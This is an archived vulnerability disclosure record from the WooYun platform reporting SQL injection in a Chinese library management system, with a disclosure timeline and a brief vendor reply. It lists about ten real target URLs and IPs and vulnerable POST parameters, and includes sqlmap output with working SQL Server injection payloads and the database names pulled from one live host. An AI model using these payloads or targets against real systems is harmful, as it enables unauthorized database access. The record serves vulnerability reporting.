{"id": 41768, "wybug_id": "wooyun-2014-087721", "wybug_title": "某图书馆系统#通用SQL注入漏洞", "wybug_corp": "天睿电子图书管理系统", "wybug_author": "路人甲", "wybug_date": "2014-12-23 10:43", "wybug_open_date": "2015-03-23 10:44", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "注射漏洞利用技巧", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-29：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-23：\t细节向公众公开  简要描述： RT 详细说明：  看案例如下:http://222.189.45.162/dzts/us_mima2.asphttp://lsxnmxx.js.cn:41516/tushu/us_mima2.asphttp://ts.gylyxx.com/us_mima2.asphttp://221.181.233.195:10003/us_mima2.asphttp://221.181.191.140/dzts/us_mima2.asphttp://221.231.112.70:2001/syxdzts/us_mima2.asphttp://tushu.dhxctzx.com/us_mima2.asphttp://www.gyxjsxx.com/tushu/us_mima2.asphttp://220.170.135.156:88/dzts//us_mima2.asphttp://61.175.231.112:8090/dzts/us_mima2.aspPOST参数:T2=360&T3=360&T4=360&B3=%EF%BF%BD%E1%BD%BB&T1=360参数基本都存在注入。1.测试注入:http://61.175.231.112:8090/dzts/us_mima2.aspPOST参数:T2=360&T3=360&T4=360&B3=%EF%BF%BD%E1%BD%BB&T1=360\n\n\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: T2    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: T2=360' AND 3471=CONVERT(INT,(SELECT CHAR(113)+CHAR(114)+CHAR(113)+CHAR(101)+CHAR(113)+(SELECT (CASE WHEN (3471=3471) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(120)+CHAR(120)+CHAR(104)+CHAR(113))) AND 'AwVD'='AwVD&T3=360&T4=360&B3=%EF%BF%BD%E1%BD%BB&T1=360    Type: UNION query    Title: Generic UNION query (NULL) - 4 columns    Payload: T2=360' UNION ALL SELECT NULL,NULL,NULL,CHAR(113)+CHAR(114)+CHAR(113)+CHAR(101)+CHAR(113)+CHAR(113)+CHAR(78)+CHAR(102)+CHAR(71)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(85)+CHAR(119)+CHAR(103)+CHAR(113)+CHAR(120)+CHAR(120)+CHAR(104)+CHAR(113)-- &T3=360&T4=360&B3=%EF%BF%BD%E1%BD%BB&T1=360    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: T2=360'; WAITFOR DELAY '0:0:5'--&T3=360&T4=360&B3=%EF%BF%BD%E1%BD%BB&T1=360    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)    Payload: T2=360' AND 6861=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'utvq'='utvq&T3=360&T4=360&B3=%EF%BF%BD%E1%BD%BB&T1=360---[19:15:18] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2005[19:15:18] [INFO] fetching database names[19:15:19] [INFO] the SQL query used returns 11 entries[19:15:20] [INFO] retrieved: dzts[19:15:24] [INFO] retrieved: gcxx[19:15:25] [INFO] retrieved: master[19:15:26] [INFO] retrieved: model[19:15:27] [INFO] retrieved: msdb[19:15:28] [INFO] retrieved: tempdb[19:15:29] [INFO] retrieved: wd[19:15:29] [INFO] retrieved: xbk[19:15:30] [INFO] retrieved: xpk[19:15:31] [INFO] retrieved: zxpt[19:15:32] [INFO] retrieved: zztsavailable databases [11]:[*] dzts[*] gcxx[*] master[*] model[*] msdb[*] tempdb[*] wd[*] xbk[*] xpk[*] zxpt[*] zzts[19:15:32] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 12 times[19:15:32] [INFO] fetched data logged to text files under 'C:\\Documents and Settings\\Administrator\\.sqlmap\\output\\61.175.231.112'\n我就测试一个。都存在的。   漏洞证明：  \n\n   修复方案：  过滤参数   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2014-12-26 15:51 厂商回复： CNVD确认所述漏洞情况，暂未建立与软件生产厂商的直接处置渠道，待认领。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}